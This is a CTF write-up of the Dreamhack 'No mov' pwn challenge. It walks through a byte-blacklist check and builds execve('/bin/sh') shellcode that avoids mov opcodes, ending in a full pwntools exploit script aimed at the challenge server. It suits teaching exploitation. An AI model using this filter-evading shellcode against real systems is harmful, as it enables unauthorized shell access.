+++
date = '2026-05-07'
draft = false
title = 'Dreamhack No mov Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview
    
셸코딩, 이제는 익숙해졌겠죠? mov가 없이도 셸코딩할 수 있는지 한 번 테스트해봅시다.
이 바이너리는 여러분이 입력한 셸코드에 mov에 해당하는 바이트가 있는지 확인하고, 없으면 실행시켜줍니다.
어떻게든 ./flag를 읽어와보세요!

---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int bytes_read; // edx
  void *s; // [rsp+10h] [rbp-10h]
  _QWORD *mmaped_page; // [rsp+18h] [rbp-8h]

  initialize(argc, argv, envp);
  s = get_mmaped_page();
  mmaped_page = get_mmaped_page();
  if ( s && mmaped_page )
  {
    memset(s, 144, 0x1000u);
    memset(mmaped_page, 0, 0x1000u);
    printf("Give me your shellcode > ");
    bytes_read = read(0, s, 0x800u);
    if ( (unsigned int)verify((__int64)s, bytes_read) )
      mmaped_page[255] = s;
    else
      puts("No.");
    return 0;
  }
  else
  {
    puts("Failed mmap");
    return 1;
  }
}
```



---

More shellcode!

## Identifying the vulnerabilities

Let's analyze what's happening in here a little. We have `0x800` bytes of shellcode, quite a lot! I don't see it getting executed anywhere, only that the `mmap` is RWX, but whatever.

```c
__int64 __fastcall verify(__int64 s, int bytes_read)
{
  int i; // [rsp+18h] [rbp-38h]
  unsigned int j; // [rsp+1Ch] [rbp-34h]
  _QWORD v5[3]; // [rsp+20h] [rbp-30h]
  int v6; // [rsp+38h] [rbp-18h]
  __int16 v7; // [rsp+3Ch] [rbp-14h]
  unsigned __int64 v8; // [rsp+48h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  v5[0] = 0xA1A08E8C8B8A8988LL;
  v5[1] = 0xB3B2B1B0A5A4A3A2LL;
  v5[2] = 0xBBBAB9B8B7B6B5B4LL;
  v6 = 0xBFBEBDBC;
  v7 = 0xC7C6;
  for ( i = 0; i < bytes_read; ++i )
  {
    for ( j = 0; j <= 0x1D; ++j )
    {
      if ( *(_BYTE *)(i + s) == *((_BYTE *)v5 + (int)j) )
        return 0;
    }
  }
  return 1;
}
```

Here, for each byte in our input, we compare it to one of the bytes in `v5` (we check from `v5` to `v5 + 29`). `v5` stores three 8-byte values. So that's just a blacklist for us. But it's also checking beyond `v5`; There's hex stored in `v6` and `v7`, and it's checking up to 29.

Interesting, let's see what is forbidden for us!

I first, of course, tried the easy way out:

```python
sc = asm(shellcraft.sh())
bad = bytes.fromhex('A1A08E8C8B8A8988B3B2B1B0A5A4A3A2BBBAB9B8B7B6B5B4BFBEBDBCC7C6')
encoded = pwnlib.encoders.encode(sc, avoid=bad)
print(len(encoded))
```

But I got back the message `No encoders for amd64 which can avoid b'\x88\x89\x8a\x8b\x8c\x8e\xa0\xa1\xa2\xa3\xa4\xa5\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb'`. Well I sure can!

I tested a couple asm functions, and `mov` did indeed seem to be getting blacklisted a lot because it contained `0x89` or `0xc7`. I made this little helper function:

```python
bad = bytearray.fromhex('A1A08E8C8B8A8988B3B2B1B0A5A4A3A2BBBAB9B8B7B6B5B4BFBEBDBCC7C6')

def is_ok(sc):
    for b in bad:
        if b in sc:
            print(f"bad, found {hex(b)}!")
            return 0
    return 1
```

So, what can we use instead of `mov`? Well, after a quick Google search, looks like `lea`! But we have to understand the differences between them. If you're actually curious read [this](https://ratfactor.com/cards/lea). If not, look at it like this:

`mov edi, 0x100` = `lea edi, [0x100]`

I came up with this glorious shellcode, but it kept crashing:

```python
sc = asm('''
lea rax, [0x68732f6e]
push rax
lea rax, [0x69622f]
push rax

lea rdi, [rsp]

xor rsi, rsi
xor rdx, rdx

lea rax, [0x3b]
syscall
''')
```

The reason was that I was pushing the whole `rax`, but I was only loading half of it each time; So it ended up looking like this:

```c
0x0000000068732f6e
0x000000000069622f
```

So, after loading the first value, we can shift it to the left four bytes (that's with the null byte I didn't add in the sequence above). That's 8 * 4 bits, so we move them to the left we can make some space on the right; Then, we can `or` it with the remaining part of the lower bytes.

```python
sc = asm('''
lea rax, [0x0068732f]
shl rax, 32
or rax, 0x6e69622f
push rax

lea rdi, [rsp]

xor rsi, rsi
xor rdx, rdx

lea rax, [0x3b]
syscall
''')
```

Now, it works locally! Let's connect remotely and get the flag!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/nomov/deploy/main')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:14508'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

bad = bytearray.fromhex('A1A08E8C8B8A8988B3B2B1B0A5A4A3A2BBBAB9B8B7B6B5B4BFBEBDBCC7C6')

def is_ok(sc):
    for b in bad:
        if b in sc:
            print(f"bad, found {hex(b)}!")
            return 0
    return 1
    
sc = asm('''
lea rax, [0x0068732f]
shl rax, 32
or rax, 0x6e69622f
push rax

lea rdi, [rsp]

xor rsi, rsi
xor rdx, rdx

lea rax, [0x3b]
syscall
''')

is_ok(sc)
print(sc)
p.send(sc)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/nomov.py)**.
